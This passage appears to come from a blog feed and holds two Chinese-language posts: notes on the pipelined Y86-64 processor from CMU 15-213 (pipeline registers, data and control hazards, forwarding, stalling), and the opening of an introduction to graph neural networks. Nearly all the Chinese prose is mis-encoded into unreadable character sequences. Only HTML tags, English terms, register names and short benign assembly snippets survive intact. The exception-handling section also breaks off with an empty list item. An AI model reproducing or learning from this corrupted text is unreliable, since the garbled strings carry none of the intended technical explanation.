æ¥ç¡®å®šæ˜¯å¦è¿›è¡Œæ¡ä»¶åˆ†æ”¯æˆ–æ¡ä»¶æ•°æ®ä¼ é€ï¼Œå®ƒäº§ç”Ÿä¿¡å·Cndï¼Œç”¨äºè®¾ç½®æ¡ä»¶ä¼ é€çš„destEã€‚</p><p><img src="/Pictures/CMU15-213/P3.png"></p></li><li><p>è®¿å­˜é˜¶æ®µã€‚</p><p>ä¸¤ä¸ªæ§åˆ¶å—äº§ç”Ÿå†…å­˜åœ°å€å’Œå†…å­˜è¾“å…¥æ•°æ®çš„å€¼ï¼Œå¦å¤–ä¸¤ä¸ªå—äº§ç”Ÿåº”è¯¥æ˜¯è¯»è¿˜æ˜¯å†™çš„æ§åˆ¶ä¿¡å·ã€‚å½“æ‰§è¡Œè¯»æ“ä½œæ—¶ï¼Œå†…å­˜äº§ç”Ÿå€¼valMã€‚</p><p><img src="/Pictures/CMU15-213/P4.png"></p></li><li><p>æ›´æ–°PCé˜¶æ®µã€‚</p><p>æ ¹æ®æŒ‡ä»¤ä»£ç å’Œåˆ†æ”¯æ ‡å¿—ï¼Œäº§ç”Ÿæ–°çš„PCå€¼ã€‚</p></li></ol><h2 id="æµæ°´çº¿è®¾è®¡"><a href="#æµæ°´çº¿è®¾è®¡" class="headerlink" title="æµæ°´çº¿è®¾è®¡"></a>æµæ°´çº¿è®¾è®¡</h2><p>åœ¨SEQè®¾è®¡ä¸­ï¼Œæ¯æ¡æŒ‡ä»¤ç»“æŸä¹‹åï¼Œç³»ç»Ÿå†æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚ä½†äº‹å®ä¸Šä¸éœ€è¦ç­‰å¾…æŒ‡ä»¤å®Œå…¨æ‰§è¡Œä¹‹åå†å¼€å§‹è¿›è¡Œä¸‹ä¸€æŒ‡ä»¤çš„æ‰§è¡Œã€‚</p><p>å‡è®¾æˆ‘ä»¬å°†ä¸€æ¡æŒ‡ä»¤çš„æ‰§è¡Œåˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µABCï¼Œé‚£ä¹ˆåœ¨æŒ‡ä»¤1æ‰§è¡Œå®ŒAé˜¶æ®µåï¼ŒæŒ‡ä»¤2ä¾¿å¯ä»¥å¼€å§‹æ‰§è¡ŒAé˜¶æ®µï¼ŒåŒæ—¶æŒ‡ä»¤ä¸€è¿›å…¥Bé˜¶æ®µçš„æ‰§è¡Œã€‚ä»¥æ­¤ç±»æ¨ï¼Œå‡è®¾æ¯ä¸ªé˜¶æ®µçš„æ‰§è¡Œæ—¶é—´ä¸º120psï¼Œé‚£ä¹ˆæ¯120pséƒ½æœ‰ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œå®Œæ¯•ï¼Œä¸€æ¡æ–°æŒ‡ä»¤å¼€å§‹æ‰§è¡Œã€‚</p><p>ä¸€èˆ¬è€Œè¨€ï¼Œæ¯ä¸ªé˜¶æ®µæ‰€éœ€çš„æ—¶é—´æ˜¯ä¸ä¸€è‡´çš„ï¼Œè¿™æ—¶æˆ‘ä»¬å–æ—¶é—´æœ€é•¿çš„ä¸ºæ—¶é’Ÿå‘¨æœŸã€‚</p><p>äº†è§£æµæ°´çº¿è®¾è®¡çš„åŸç†ä¹‹åï¼Œæˆ‘ä»¬å°è¯•è®¾è®¡ä¸€ä¸ªæµæ°´çº¿åŒ–çš„Y86-64å¤„ç†å™¨ã€‚é¦–å…ˆæˆ‘ä»¬æ¥å¯¹ç°æœ‰çš„SEQå¤„ç†å™¨åšä¸€äº›å°çš„æ”¹åŠ¨ï¼Œå°†PCçš„è®¡ç®—æŒªåˆ°å–æŒ‡é˜¶æ®µï¼Œä¹‹ååœ¨å„ä¸ªé˜¶æ®µä¹‹é—´åŠ ä¸Šæµæ°´çº¿å¯„å­˜å™¨ã€‚</p><p>SEQ+ä½œä¸ºå®ç°æµæ°´çº¿åŒ–è®¾è®¡çš„ä¸€ä¸ªè¿‡æ¸¡é˜¶æ®µï¼Œæˆ‘ä»¬å¿…é¡»ç¨å¾®è°ƒæ•´ä¸€ä¸‹SEQä¸­äº”ä¸ªé˜¶æ®µçš„é¡ºåºï¼Œä½¿æ›´æ–°PCé˜¶æ®µåœ¨ä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸå¼€å§‹æ—¶æ‰§è¡Œè€Œä¸æ˜¯ç»“æŸæ—¶æ‰§è¡Œã€‚</p><p>å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä¿å­˜ä¸Šä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸå†…è®¡ç®—å‡ºæ¥çš„ä¿¡å·å€¼ï¼Œåœ¨ä¸‹ä¸€ä¸ªå‘¨æœŸå¼€å§‹æ—¶è®¡ç®—å‡ºæ–°PCå€¼ã€‚</p><p>åŸºäºSEQ+ï¼Œæˆ‘ä»¬åœ¨å„ä¸ªé˜¶æ®µä¹‹é—´æ’å…¥æµæ°´çº¿å¯„å­˜å™¨ï¼Œå¾—åˆ°PIPE-å¤„ç†å™¨ï¼š</p><p><img src="/Pictures/CMU15-213/PIPE.png"></p><p>æµæ°´çº¿å¯„å­˜å™¨æŒ‰å¦‚ä¸‹æ–¹å¼ç¼–å·ï¼š</p><ul><li>Fï¼šä¿å­˜ç¨‹åºè®¡æ•°å™¨çš„<strong>é¢„æµ‹å€¼</strong>ã€‚</li><li>Dï¼šä½äºå–æŒ‡å’Œè¯‘ç é˜¶æ®µä¹‹é—´ï¼Œä¿å­˜å…³äºæœ€æ–°å–å‡ºçš„æŒ‡ä»¤çš„ä¿¡æ¯ï¼Œå³å°†ç”±è¯‘ç é˜¶æ®µè¿›è¡Œå¤„ç†ã€‚</li><li>Eï¼šä½äºè¯‘ç å’Œæ‰§è¡Œé˜¶æ®µä¹‹é—´ï¼Œä¿å­˜å…³äºæœ€æ–°è¯‘ç çš„æŒ‡ä»¤å’Œä»å¯„å­˜å™¨æ–‡ä»¶è¯»å‡ºçš„å€¼çš„ä¿¡æ¯ï¼Œå³å°†ç”±æ‰§è¡Œé˜¶æ®µè¿›è¡Œå¤„ç†ã€‚</li><li>Mï¼šä½äºæ‰§è¡Œå’Œè®¿å­˜é˜¶æ®µä¹‹é—´ï¼Œä¿å­˜æœ€æ–°æ‰§è¡Œçš„æŒ‡ä»¤çš„ç»“æœï¼Œå³å°†ç”±è®¿å­˜é˜¶æ®µè¿›è¡Œå¤„ç†ï¼Œè¿˜ä¿å­˜å…³äºç”¨äºå¤„ç†æ¡ä»¶è½¬ç§»çš„åˆ†æ”¯æ¡ä»¶å’Œåˆ†æ”¯ç›®æ ‡çš„ä¿¡æ¯ã€‚</li><li>Wï¼šä½äºè®¿å­˜é˜¶æ®µå’Œåé¦ˆè·¯å¾„ä¹‹é—´ï¼Œåé¦ˆè·¯å¾„å°†è®¡ç®—å‡ºæ¥çš„å€¼æä¾›ç»™å¯„å­˜å™¨æ–‡ä»¶å†™ï¼Œè€Œå½“å®ŒæˆretæŒ‡ä»¤æ—¶ï¼Œå®ƒè¿˜è¦å‘PCé€‰æ‹©é€»è¾‘æä¾›è¿”å›åœ°å€ã€‚</li></ul><div class="note note-primary">            <p>M_statä¸m_statçš„åŒºåˆ«ï¼š</p><p>åœ¨å‘½åç³»ç»Ÿä¸­ï¼Œå¤§å†™çš„å‰ç¼€â€œDâ€ã€â€œEâ€ã€â€œMâ€ã€â€œWâ€æŒ‡æµæ°´çº¿å¯„å­˜å™¨ï¼Œæ‰€ä»¥M_statæŒ‡ä»£æµæ°´çº¿å¯„å­˜å™¨çš„çŠ¶æ€ç å­—æ®µã€‚è€Œå°å†™çš„å‰ç¼€â€œfâ€ã€â€œdâ€ã€â€œeâ€ã€â€œmâ€ã€â€œwâ€å€¼æµæ°´çº¿é˜¶æ®µï¼Œæ•…m_statæŒ‡ä»£åœ¨è®¿å­˜é˜¶æ®µä¸­ç”±æ§åˆ¶é€»è¾‘å—äº§å‡ºçš„çŠ¶æ€ä¿¡å·ã€‚</p>          </div><p>åœ¨ä¸Šé¢æˆ‘ä»¬æåˆ°ï¼ŒFå¯„å­˜å™¨ä¿å­˜ç€PCçš„é¢„æµ‹å€¼ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬å¹¶ä¸çŸ¥é“æ˜¯å¦éœ€è¦é€‰æ‹©æ¡ä»¶åˆ†æ”¯ï¼Œæ‰€ä»¥æ— æ³•é©¬ä¸Šç¡®å®šä¸‹ä¸€æ¡æŒ‡ä»¤çš„ä½ç½®ï¼Œè‡³å°‘è¦æ±‚æŒ‡ä»¤é€šè¿‡æ‰§è¡Œé˜¶æ®µã€‚ä¸ºäº†ä½¿å¤„ç†å™¨ä¿æŒæ¯ä¸ªæ—¶é’Ÿå‘¨æœŸæ‰§è¡Œä¸€æ¡æŒ‡ä»¤çš„ååé‡ï¼Œæˆ‘ä»¬éœ€è¦é¢„æµ‹ä¸€ä¸ªPCå€¼ã€‚</p><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬é‡‡å–æ€»æ˜¯é¢„æµ‹<em>é€‰æ‹©äº†æ¡ä»¶åˆ†æ”¯</em>çš„æ–¹æ¡ˆï¼Œç ”ç©¶è¡¨æ˜æˆåŠŸç‡å¤§çº¦ä¸º60%ã€‚</p><p>å¦ä¸€ä¸ªæ˜¯é‡åˆ°retæŒ‡ä»¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦æŒ‡ä»¤é€šè¿‡è®¿å­˜é˜¶æ®µæ‰èƒ½ç¡®å®šè¿”å›åœ°å€ã€‚ä½†ä¸æ¡ä»¶è½¬ç§»ä¸åŒï¼Œretè¿”å›æ ˆé¡¶çš„å­—ï¼Œå†…å®¹å¯ä»¥æ˜¯ä»»æ„çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨è®¾è®¡æ—¶ä¸ä¼šè¿›è¡Œä»»ä½•é¢„æµ‹ï¼Œåªæ˜¯ç®€å•çš„æš‚åœå¤„ç†æ–°æŒ‡ä»¤ï¼Œç›´åˆ°retæŒ‡ä»¤é€šè¿‡å†™å›é˜¶æ®µã€‚</p><h3 id="æµæ°´çº¿å†’é™©"><a href="#æµæ°´çº¿å†’é™©" class="headerlink" title="æµæ°´çº¿å†’é™©"></a>æµæ°´çº¿å†’é™©</h3><p>åœ¨å®é™…è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è€ƒè™‘æŒ‡ä»¤ä¹‹é—´ç›¸äº’å…³è”çš„æƒ…å†µï¼Œå³åä¸€æŒ‡ä»¤éœ€è¦å‰ä¸€æŒ‡ä»¤æ‰§è¡Œå®Œæ¯•åæ‰èƒ½æ­£ç¡®è¿è¡Œã€‚ä¸€èˆ¬è€Œè¨€ç›¸å…³æœ‰ä¸¤ç§å½¢å¼ï¼š<strong>æ•°æ®ç›¸å…³</strong>ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤ä¼šç”¨åˆ°è¿™ä¸€æ¡æŒ‡ä»¤è®¡ç®—çš„ç»“æœï¼›<strong>æ§åˆ¶ç›¸å…³</strong>ï¼Œä¸€æ¡æŒ‡ä»¤è¦ç¡®å®šä¸‹ä¸€æ¡æŒ‡ä»¤çš„ä½ç½®ï¼Œä¾‹å¦‚è¿”å›ã€è·³è½¬ã€è°ƒç”¨æŒ‡ä»¤ã€‚</p><p>è¿™äº›ç›¸å…³å¯èƒ½é€ æˆæµæ°´çº¿çš„è®¡ç®—é”™è¯¯ï¼Œç§°ä¸ºå†’é™©ï¼ˆhazardï¼‰ã€‚æˆ‘ä»¬é¦–å…ˆæ¥å¤„ç†æ•°æ®å†’é™©ã€‚</p><p>ä¸‹é¢çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/Pictures/CMU15-213/prog1.png"></div><div class="group-image-wrap"><img src="/Pictures/CMU15-213/prog2.png"></div></div></div><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨prog2ä¸­ï¼Œç”±äº<code>%rax</code>çš„å€¼æœªèƒ½æ­£ç¡®è¯»å–ï¼Œå¯¼è‡´<code>addq</code>äº§ç”Ÿé”™è¯¯ç»“æœã€‚</p><p>ä¸ºäº†é¿å…è¿™ç§hazardï¼Œæˆ‘ä»¬ä¸€èˆ¬é‡‡å–ä»¥ä¸‹æ–¹æ³•ï¼š</p><ol><li><p>æš‚åœï¼ˆstallingï¼‰</p><p>æš‚åœæ—¶ï¼Œå¤„ç†å™¨ä¼šåœæ­¢æµæ°´çº¿ä¸­ä¸€æ¡æˆ–å¤šæ¡æŒ‡ä»¤ï¼Œç›´åˆ°å†’é™©æ¡ä»¶ä¸å†æ»¡è¶³ã€‚</p><p>ç”¨ä¸Šé¢çš„ä¾‹å­æ¥è¯´ï¼Œå½“æŒ‡ä»¤addqå¤„äºè¯‘ç é˜¶æ®µæ—¶ï¼Œæµæ°´çº¿æ§åˆ¶é€»è¾‘å‘ç°æ‰§è¡Œã€è®¿å­˜æˆ–å†™å›é˜¶æ®µä¸­è‡³å°‘æœ‰ä¸€æ¡æŒ‡ä»¤ä¼šæ›´æ–°å¯„å­˜å™¨<code>%rdx</code>æˆ–<code>%rax</code>ï¼Œä¾¿ä¼šå°†addqé˜»å¡åœ¨è¯‘ç é˜¶æ®µã€‚å½“ç„¶ï¼Œä¹Ÿè¦é˜»å¡å…¶åçš„æŒ‡ä»¤çš„é˜¶æ®µã€‚</p><p><img src="/Pictures/CMU15-213/stalling.png"></p></li><li><p>ç”¨è½¬å‘æ¥é¿å…æ•°æ®å†’é™©</p><p>è¿™ç§ç­–ç•¥æ—¶å°†è¦å†™å…¥å¯„å­˜å™¨çš„å€¼ä¼ åˆ°æµæ°´çº¿å¯„å­˜å™¨Eä½œä¸ºæºæ“ä½œæ•°ï¼Œä¹Ÿå°±æ˜¯è¯´<code>addq</code>ä¸ä»<code>%rax</code>ä¸­è¯»å–æ“ä½œæ•°ï¼Œè€Œæ˜¯ç›´æ¥åœ¨å†™å…¥<code>%rax</code>çš„åŒæ—¶ä¼ é€’ä¸ºæ“ä½œæ•°ã€‚è¿™ç§æŠ€æœ¯ç§°ä¸ºæ•°æ®è½¬å‘ï¼Œæœ‰æ—¶ç§°ä¸ºæ—è·¯ã€‚</p><p><img src="/Pictures/CMU15-213/bypassing.png"></p><p><strong>ä»æ‰§è¡Œé˜¶æ®µè½¬å‘</strong>ï¼š</p><ul><li>å¦‚æœæ‰§è¡Œé˜¶æ®µçš„ ALU è®¡ç®—ç»“æœ <code>valE</code> æ˜¯å½“å‰æŒ‡ä»¤éœ€è¦çš„æºæ“ä½œæ•°ï¼Œé‚£ä¹ˆç›´æ¥å°† <code>valE</code> è½¬å‘åˆ°è¯‘ç é˜¶æ®µä½¿ç”¨ã€‚</li><li>ä¾‹å¦‚ï¼Œå½“å‰æŒ‡ä»¤æ˜¯ <code>rmmovq</code>ï¼Œéœ€è¦æºå¯„å­˜å™¨ <code>rA</code> çš„å€¼ï¼Œè€Œå‰ä¸€æ¡æŒ‡ä»¤æ˜¯ <code>addq</code>ï¼Œå†™å…¥å¯„å­˜å™¨ <code>rA</code>ã€‚<code>addq</code> çš„ç»“æœåœ¨æ‰§è¡Œé˜¶æ®µè®¡ç®—å®Œæˆï¼Œå¯ä»¥ç«‹å³è½¬å‘ç»™ <code>rmmovq</code>ã€‚</li></ul><p><strong>ä»è®¿å­˜é˜¶æ®µè½¬å‘</strong>ï¼š</p><ul><li>å¦‚æœè®¿å­˜é˜¶æ®µçš„å†…å­˜è¯»å–ç»“æœ <code>valM</code> æ˜¯å½“å‰æŒ‡ä»¤éœ€è¦çš„æºæ“ä½œæ•°ï¼Œé‚£ä¹ˆç›´æ¥å°† <code>valM</code> è½¬å‘åˆ°è¯‘ç é˜¶æ®µä½¿ç”¨ã€‚</li><li>ä¾‹å¦‚ï¼Œå½“å‰æŒ‡ä»¤æ˜¯ <code>addq</code>ï¼Œéœ€è¦æºå¯„å­˜å™¨ <code>rA</code> çš„å€¼ï¼Œè€Œå‰ä¸€æ¡æŒ‡ä»¤æ˜¯ <code>mrmovq</code>ï¼Œä»å†…å­˜ä¸­è¯»å–å€¼å†™å…¥å¯„å­˜å™¨ <code>rA</code>ã€‚<code>mrmovq</code> çš„ç»“æœåœ¨è®¿å­˜é˜¶æ®µè·å¾—ï¼Œå¯ä»¥ç«‹å³è½¬å‘ç»™ <code>addq</code>ã€‚</li></ul><p><strong>ä»å†™å›é˜¶æ®µè½¬å‘</strong>ï¼š</p><ul><li>å¦‚æœå†™å›é˜¶æ®µçš„ç»“æœæ˜¯å½“å‰æŒ‡ä»¤éœ€è¦çš„æºæ“ä½œæ•°ï¼Œé‚£ä¹ˆç›´æ¥å°†å†™å›ç»“æœè½¬å‘åˆ°è¯‘ç é˜¶æ®µä½¿ç”¨ã€‚</li><li>ä¾‹å¦‚ï¼Œå½“å‰æŒ‡ä»¤æ˜¯ <code>subq</code>ï¼Œéœ€è¦æºå¯„å­˜å™¨ <code>rB</code> çš„å€¼ï¼Œè€Œå‰ä¸€æ¡æŒ‡ä»¤æ˜¯ <code>rmmovq</code>ï¼Œç»“æœå°†å†™å›å¯„å­˜å™¨ <code>rB</code>ã€‚<code>rmmovq</code> çš„ç»“æœåœ¨å†™å›é˜¶æ®µå¯ä»¥ç«‹å³è½¬å‘ç»™ <code>subq</code>ã€‚</li></ul></li><li><p>åŠ è½½&#x2F;ä½¿ç”¨æ•°æ®å†’é™©</p><p>æœ‰ä¸€ç±»æ•°æ®å†’é™©ä¸èƒ½å•çº¯ç”¨è½¬å‘æ¥è§£å†³ï¼Œå› ä¸ºå†…å­˜è¯»åœ¨æµæ°´çº¿å‘ç”Ÿçš„æ¯”è¾ƒæ™šã€‚è¿™æ—¶æˆ‘ä»¬é€‰æ‹©å°†æš‚åœå’Œè½¬å‘ç»“åˆèµ·æ¥ï¼Œé€šè¿‡é€‚å½“çš„æš‚åœæ¥å¤„ç†åŠ è½½&#x2F;ä½¿ç”¨å†’é™©ï¼Œè¿™ç§æ–¹æ³•å«<strong>åŠ è½½äº’é”</strong>ã€‚</p></li><li><p>é¿å…æ§åˆ¶å†’é™©</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œæ§åˆ¶å†’é™©åªä¼šå‘ç”Ÿåœ¨retæŒ‡ä»¤å’Œè·³è½¬æŒ‡ä»¤ã€‚å¹¶ä¸”åªæœ‰åœ¨æ¡ä»¶è·³è½¬æ–¹å‘é¢„æµ‹é”™è¯¯æ—¶æ‰ä¼šé€ æˆéº»çƒ¦ã€‚</p><p>ä»¥ä¸‹é¢è¿™æ®µä»£ç ä¸ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">irmovq stack,%rsp<br>call proc<br>irmovq$10,%rdx<br>halt<br>.pos 0x20<br>proc:<br>ret<br>rrmovq%rdx,%rbx<br>.pos 0x30<br>stack:<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹çœ‹æµæ°´çº¿å›¾ï¼š</p><p><img src="/Pictures/CMU15-213/prog7.png"></p><p>è¿™é‡Œåœ¨retæŒ‡ä»¤æ‰§è¡Œæ—¶ï¼Œå…¶å®ƒçš„æŒ‡ä»¤éƒ½ä¼šæš‚åœï¼Œç»“æŸæ—¶å°†PCè®¾ç½®ä¸ºä½äºè¿”å›ç‚¹çš„irmovqæŒ‡ä»¤ã€‚è¦å¤„ç†é¢„æµ‹é”™è¯¯çš„åˆ†æ”¯ï¼Œå¯ä»¥è€ƒè™‘ä¸‹é¢è¿™æ®µä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xorq%rax,%rax<br>jnetarget<br>irmovq$1,%rax<br>halt<br>target:<br>irmovq$2,%rdx<br>irmovq$3,%rbx<br>halt<br></code></pre></td></tr></table></figure><p><img src="/Pictures/CMU15-213/prog7fix.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œç”±äºæˆ‘ä»¬é‡‡å–é»˜è®¤è·³è½¬ç­–ç•¥ï¼Œåœ¨ç¬¬äºŒæ¡æŒ‡ä»¤è¿›å…¥æ‰§è¡Œé˜¶æ®µï¼ˆEï¼‰æ—¶ï¼Œå·²ç»æœ‰ä¸¤æ¡æŒ‡ä»¤å¼€å§‹æ‰§è¡Œã€‚å¹¸è¿çš„æ˜¯å®ƒä»¬å¹¶æ²¡æœ‰å¯¼è‡´ç¨‹åºå‘˜å¯è§çš„çŠ¶æ€ç å‘ç”Ÿå˜åŒ–ï¼Œå› æ­¤æˆ‘ä»¬åªè¦å­å•Šä¸‹ä¸€ä¸ªå‘¨æœŸå‘è¯‘ç å’Œæ‰§è¡Œé˜¶æ®µæ’å…¥æ——è¢ï¼ŒåŒæ—¶å–å‡ºè·³è½¬æŒ‡ä»¤åé¢çš„æŒ‡ä»¤ï¼Œè¿™æ ·å°±èƒ½è¾¾åˆ°å–æ¶ˆçš„ä½œç”¨ã€‚</p></li></ol><h3 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h3><p>æˆ‘ä»¬çš„æŒ‡ä»¤é›†ä½“ç³»ç»“æ„åŒ…æ‹¬ä¸‰ç§ä¸åŒçš„å†…éƒ¨äº§ç”Ÿçš„å¼‚å¸¸ï¼š1ï¼‰haltæŒ‡ä»¤ï¼Œ2ï¼‰æœ‰éæ³•æŒ‡ä»¤å’ŒåŠŸèƒ½ç ç»„åˆçš„æŒ‡ä»¤ï¼Œ3ï¼‰å–æŒ‡æˆ–æ•°æ®è¯»å†™è¯•å›¾è®¿é—®ä¸€ä¸ªéæ³•åœ°å€ã€‚</p><ol><li>å¤šä¸ªå¼‚å¸¸ï¼Œä¼˜å…ˆæŠ¥å‘Šæµæ°´çº¿ä¸­æœ€æ·±çš„</li><li></li></ol>]]></content>
    
    
    <categories>
      
      <category>CMU15-213</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GNNâ€”â€”å›¾ç¥ç»ç½‘ç»œ</title>
    <link href="/2024/03/20/GNN%E2%80%94%E2%80%94%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
    <url>/2024/03/20/GNN%E2%80%94%E2%80%94%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="Graph"><a href="#Graph" class="headerlink" title="Graph"></a>Graph</h1><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯<em>Graph</em>ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œå›¾ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š</p><ol><li><strong>V</strong>  Vertex(or node) attributesï¼ŒèŠ‚ç‚¹</li></ol><p><img src="/Pictures/DL/GNN/Vertex.png" alt="Vertex"></p><p>å­å±æ€§åŒ…æ‹¬èŠ‚ç‚¹æ ‡è¯†ï¼ŒèŠ‚ç‚¹é‚»å±…æ•°</p><ol start="2"><li><strong>E</strong> Edge(or link) attributes and directionsï¼Œè¾¹</li></ol><p><img src="/Pictures/DL/GNN/Edge.png" alt="Edge"></p><p>å­å±æ€§åŒ…æ‹¬è¾¹æ ‡è¯†ï¼Œè¾¹æƒé‡ã€‚<br>è¾¹å¯ä»¥åŒ…æ‹¬æœ‰å‘è¾¹å’Œæ— å‘è¾¹ï¼Œæœ‰å‘è¾¹è¡¨ç¤ºä¿¡æ¯å•æ–¹å‘æµå…¥ï¼Œå³ä»æºèŠ‚ç‚¹æµå‘ç›®æ ‡èŠ‚ç‚¹ï¼›è€Œæ— å‘è¾¹å¯ä»¥çœ‹ä¸ºä¸¤ä¸ªæœ‰å‘è¾¹çš„å åŠ ï¼Œè¡¨ç¤ºä¿¡æ¯åŒå‘æµåŠ¨ã€‚</p><p><img src="/Pictures/DL/GNN/twoEdges.png" alt="twoEdges"></p><ol start="3"><li><strong>U</strong> Global(or masternode) attributesï¼Œå…¨å±€ä¿¡æ¯</li></ol><p><img src="/Pictures/DL/GNN/Global.png" alt="Global"></p><p>å­å±æ€§åŒ…æ‹¬èŠ‚ç‚¹æ•°ï¼Œæœ€é•¿è·¯å¾„</p><p>ä¸ºäº†æ·±å…¥æ¢ç©¶ä¸‰è€…ä¹‹é—´çš„å…³ç³»ï¼Œæˆ‘ä»¬å°†æ¯ä¸ªèŠ‚ç‚¹ä¿¡æ¯ã€è¾¹ä¿¡æ¯å’Œå…¨å±€ä¿¡æ¯åšEmbeddingï¼Œå‚¨å­˜ä¸ºå‘é‡å½¢å¼ã€‚æ‰€ä»¥å›¾ç¥ç»ç½‘ç»œçš„æ ¸å¿ƒå°±æ˜¯å¦‚ä½•å°†æˆ‘ä»¬æƒ³è¦çš„æœ‰æ•ˆä¿¡æ¯ä¿å­˜ä¸ºå‘é‡ä»¥åŠå¦‚ä½•å»ºç«‹ç¥ç»ç½‘ç»œä»é‡Œé¢å­¦ä¹ åˆ°æœ‰ç”¨çš„ä¿¡æ¯ã€‚</p><p><img src="/Pictures/DL/GNN/Embedding.png" alt="Embedding"></p><h1 id="å°†æ•°æ®è½¬åŒ–ä¸ºGraph"><a href="#å°†æ•°æ®è½¬åŒ–ä¸ºGraph" class="headerlink" title="å°†æ•°æ®è½¬åŒ–ä¸ºGraph"></a>å°†æ•°æ®è½¬åŒ–ä¸ºGraph</h1><h2 id="Images-as-graphs"><a href="#Images-as-graphs" class="headerlink" title="Images as graphs"></a>Images as graphs</h2><p>æˆ‘ä»¬é€šå¸¸å°†å›¾åƒè§†ä¸ºå…·æœ‰å›¾åƒé€šé“çš„çŸ©å½¢ç½‘æ ¼ï¼Œå°†å®ƒä»¬è¡¨ç¤ºä¸ºæ•°ç»„ï¼ˆä¾‹å¦‚ï¼Œ244x244x3ï¼‰ã€‚<br>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†å›¾åƒç†è§£ä¸ºä¸€ç§å…·æœ‰è§„åˆ™ç»“æ„çš„Graphï¼šæ¯ä¸€ä¸ªåƒç´ ä¸ºä¸€ä¸ªèŠ‚ç‚¹ï¼Œå‚¨å­˜ç€ä»£è¡¨RGBå€¼çš„ä¸‰ç»´å‘é‡ï¼Œå¹¶é€šè¿‡è¾¹è¿æ¥åˆ°å…¶ä»–çš„åƒç´ ï¼Œæ‰€ä»¥æ¯ä¸€ä¸ªéè¾¹ç•Œåƒç´ æ­£å¥½æœ‰8ä¸ªé‚»å±…ã€‚</p><p><img src="/Pictures/DL/GNN/img2grp.png" alt="img2grp"></p><h2 id="Text-as-graphs"><a href="#Text-as-graphs" class="headerlink" title="Text as graphs"></a>Text as graphs</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†ç´¢å¼•ä¸æ¯ä¸ªå­—ç¬¦ã€å•è¯æˆ–æ ‡è®°ç›¸å…³è”ï¼Œå¹¶å°†æ–‡æœ¬è¡¨ç¤ºä¸ºè¿™äº›ç´¢å¼•çš„åºåˆ—æ¥æ•°å­—åŒ–æ–‡æœ¬ï¼Œè¿™å°†åˆ›å»ºä¸€ä¸ªç®€å•çš„æœ‰å‘å›¾ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªå­—ç¬¦æˆ–ç´¢å¼•éƒ½æ˜¯ä¸€ä¸ªç³»æ¬¸ä½†ï¼Œå¹¶é€šè¿‡è¾¹è¿æ¥åˆ°å…¶åé¢çš„èŠ‚ç‚¹ã€‚</p><p><img src="/Pictures/DL/GNN/text.png" alt="text"></p><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p>é™¤äº†ä¸Šé¢æåˆ°çš„å°†å›¾è¿ç”¨äºCVå’ŒNLPé¢†åŸŸçš„ç”¨æ³•ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†å›¾è¿ç”¨äºå…¶å®ƒå„ç§æ•°æ®å†…å®¹ä¸­ã€‚<br>ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†åˆ†å­ç»“æ„è½¬æ¢ä¸ºå›¾ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªåŸå­ä»£è¡¨ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ¯ä¸€ä¸ªåŒ–å­¦é”®ä»£è¡¨ä¸€æ¡è¾¹ï¼›<br>æˆ‘ä»¬è¿˜å¯ä»¥å°†ç¤¾äº¤ç½‘ç»œè½¬æ¢ä¸ºå›¾ï¼Œæ¯ä¸ªäººæ˜¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œäººä¸äººä¹‹é—´çš„å…³ç³»ä½œä¸ºè¾¹ï¼›æˆ‘ä»¬å¯ä»¥å°†è®ºæ–‡çš„å¼•æ–‡ç½‘ç»œè½¬æ¢ä¸ºå›¾ï¼Œå°†æ¯ç¯‡è®ºæ–‡çœ‹ä½œä¸€ä¸ªèŠ‚ç‚¹ï¼Œè€Œä¸€ç¯‡è®ºæ–‡ä¸å¦ä¸€ç¯‡è®ºæ–‡ä¹‹é—´çš„å¼•ç”¨å…³ç³»çœ‹ä½œæ˜¯ä¸€æ¡æœ‰å‘è